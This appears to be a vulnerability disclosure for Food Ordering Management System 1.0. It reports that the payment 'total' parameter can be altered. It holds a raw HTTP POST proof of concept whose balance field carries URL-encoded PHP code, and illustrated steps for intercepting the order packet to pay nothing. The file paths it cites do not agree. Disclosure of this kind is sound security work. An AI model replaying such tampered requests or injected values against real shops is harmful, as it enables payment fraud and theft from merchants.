##The Food order management system has a payment logic vulnerability

## Affected version: 
Food Ordering Management System - 1.0

## Software:
https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html

## Vulnerability File:
/foms/place-order.php

## Description:
Food Ordering Management 1.0 is vulnerable to an unrestricted amount modification logic vulnerability with total parameter in /foms/routers/place-order.php.The payment data package contains a lot of sensitive information (such as amount, order user ID), and malicious attackers can exploit this vulnerability to modify the sensitive information in the data packet.

Status: CRITICAL

POC
```
POST /foms/routers/order-router.php HTTP/1.1
Host: localhost:8088
Content-Length: 158
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8088/foms/confirm-order.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=hlodrr0cq84ndg4raumb7hpcla
Connection: close

1=4&2=5&3=5&payment_type=Wallet&address=riehf1234562131241&description=1234567890&balance=%3C%3Fphp+echo+%28%24balance-%24total%29%3B%3F%3E&total=3084&action=
```
##steps

1、Create an example: The user enters the order page to generate an order
![5ced3caf76cce98927cfa4f14e0a842](https://github.com/user-attachments/assets/4e7c683f-14b1-4923-aecb-6df60ca19ce9)

2、Fill in the order details correctly, otherwise the creation will fail
![d0b91603cc7936bb4e74f619fe18e6d](https://github.com/user-attachments/assets/4d7e6b47-c713-403e-beae-a15d7c7fa858)

3、Submit the order and grab the packet
![7e18db6e1161b60aa0cf5ae43692188](https://github.com/user-attachments/assets/caf37f07-6950-4c16-9404-bc5d5248d480)
![d04c19e34cf052b5165b3e7b9549c40](https://github.com/user-attachments/assets/b51245b1-d9fc-4ec6-ab4e-3d22931a0e8a)


4、Purchase with zero fee by modifying the amount in the payment package
![d2c264eb83deca3a7fad34397b3cdf4](https://github.com/user-attachments/assets/a6ffce4d-85bd-4527-bb87-4a7adcb2a542)
![f5e314c133e74089f5298e7f98b533b](https://github.com/user-attachments/assets/81c5c6da-b2b4-4753-9927-2957d279e878)










